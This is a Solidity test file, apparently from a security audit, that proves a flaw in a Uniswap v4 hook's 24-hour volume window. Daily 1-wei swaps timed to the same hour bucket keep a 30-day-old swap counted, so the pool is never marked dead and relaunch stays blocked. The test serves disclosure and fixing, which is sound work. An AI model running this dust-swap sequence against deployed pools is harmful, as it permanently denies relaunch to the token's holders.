// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {FinalAuditBase} from "../final/FinalAuditBase.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {SwapParams} from "v4-core/src/types/PoolOperation.sol";
import {BalanceDelta, toBalanceDelta} from "v4-core/src/types/BalanceDelta.sol";

/**
 * K1a — the 24h volume window is not a 24h window.
 *
 *  `CauldronHook._recordVolume` only zeroes the buckets it STEPS OVER, and
 *  `getVolume24h` only zeroes everything when
 *  `block.timestamp > _lastUpdateTs[id] + SECONDS_PER_DAY`. A dust swap landing
 *  in the SAME hour-of-day bucket exactly <= 86400s after the previous one
 *  advances `_lastUpdateTs` while stepping over ZERO buckets — so an ancient
 *  bucket's volume is never cleared and keeps counting toward `isDead`.
 *
 *  This test drives the PRODUCTION hook bytecode with the test contract standing
 *  in as the PoolManager (BaseHook's `onlyPoolManager`), so every line executed
 *  is the real one.
 */
contract K1a_StaleVolumeKeepsAlive is FinalAuditBase {
    using PoolIdLibrary for PoolKey;

    PoolKey internal key;
    PoolId internal pid;

    address internal constant TOKEN = address(0xf00000000000000000000000000000000000BeEF);

    function setUp() public {
        // The TEST is the PoolManager, so it can invoke the hook callbacks
        // exactly as v4 would.
        _deployOffchain(address(this));

        key = PoolKey({
            currency0: Currency.wrap(address(0)), // native quote
            currency1: Currency.wrap(TOKEN),
            fee: 3000,
            tickSpacing: 60,
            hooks: IHooks(address(hook))
        });
        pid = key.toId();

        // Adopt the pool the way the registry does.
        hook.afterInitialize(address(registry), key, uint160(1 << 96), int24(0));
    }

    /// @dev One exact-input BUY of `quoteIn` wei. Quote is currency0 and the swap
    ///      is zeroForOne + exactInput, so `_afterSwap` records volume and then
    ///      early-returns before any fee take (unspecified leg is currency1).
    function _swap(uint256 quoteIn) internal {
        SwapParams memory p = SwapParams({
            zeroForOne: true,
            amountSpecified: -int256(quoteIn),
            sqrtPriceLimitX96: 0
        });
        BalanceDelta d = toBalanceDelta(-int128(int256(quoteIn)), int128(int256(quoteIn)));
        hook.afterSwap(address(0xBEEF), key, p, d, "");
    }

    /// @dev Positive control on a SEPARATE pool (no snapshots): with no trading
    ///      at all, the window really does expire and the generation dies.
    function _controlDiesAfterOneDay() internal returns (bool dead) {
        PoolKey memory k2 = key;
        k2.fee = 500;
        PoolId p2 = k2.toId();
        hook.afterInitialize(address(registry), k2, uint160(1 << 96), int24(0));
        SwapParams memory p = SwapParams({
            zeroForOne: true, amountSpecified: -int256(10 ether), sqrtPriceLimitX96: 0
        });
        BalanceDelta d = toBalanceDelta(-int128(int256(10 ether)), int128(int256(10 ether)));
        hook.afterSwap(address(0xBEEF), k2, p, d, "");
        bool aliveNow = !hook.isDead(p2);
        require(aliveNow, "control: should be alive right after a 10 ETH swap");
        uint256 tc = vm.getBlockTimestamp();
        vm.warp(tc + 86_401);
        dead = hook.isDead(p2);
        vm.warp(tc);
    }

    /// @dev The attack: one real swap, then a 1-wei ping once per day placed in
    ///      the SAME bucket, `<= 86400s` after the previous one.
    function _attackKeepsAlive(uint256 days_)
        internal
        returns (bool aliveAfter, uint256 volAfter, uint256 elapsed)
    {
        // `vm.getBlockTimestamp()`, not `block.timestamp`: solc/viaIR sinks the
        // TIMESTAMP opcode to its use site, which reads it AFTER the warps.
        uint256 t0 = vm.getBlockTimestamp();
        uint256 t = t0;
        _swap(10 ether);
        for (uint256 i = 0; i < days_; ++i) {
            t += 86_400; // same hour-of-day bucket, delta == SECONDS_PER_DAY exactly
            vm.warp(t);
            _swap(1); // one wei of "volume"
        }
        elapsed = t - t0;
        volAfter = hook.getVolume24h(pid);
        aliveAfter = !hook.isDead(pid);
    }

    function test_K1a_staleBucketBlocksRelaunchForever() public {
        // Start at a deterministic offset inside an hour so the bucket maths is
        // easy to follow (second 1800 of the hour).
        vm.warp(1_800_000_000 - (1_800_000_000 % 3600) + 1800);

        assertEq(hook.deathThreshold(), 1 ether, "rig: threshold");

        bool controlDead = _controlDiesAfterOneDay();
        (bool aliveAfter, uint256 volAfter, uint256 elapsed) = _attackKeepsAlive(30);

        // 1. The window genuinely expires when nobody trades.
        assertTrue(controlDead, "control: pool should be dead after 24h of silence");

        // 2. 30 days later, 1 wei/day of trading, the hook still reports the
        //    ORIGINAL 10 ETH swap as "24h volume".
        emit log_named_uint("elapsed_seconds", elapsed);
        emit log_named_uint("volume24h_reported", volAfter);
        assertEq(elapsed, 30 * 86_400, "30 days elapsed");
        assertGe(volAfter, 10 ether, "stale 30-day-old volume still counted");

        // 3. So the generation can never be declared dead and `relaunch()`
        //    reverts TokenStillAlive forever.
        assertTrue(aliveAfter, "isDead() still false after 30 days of dust");
    }
}
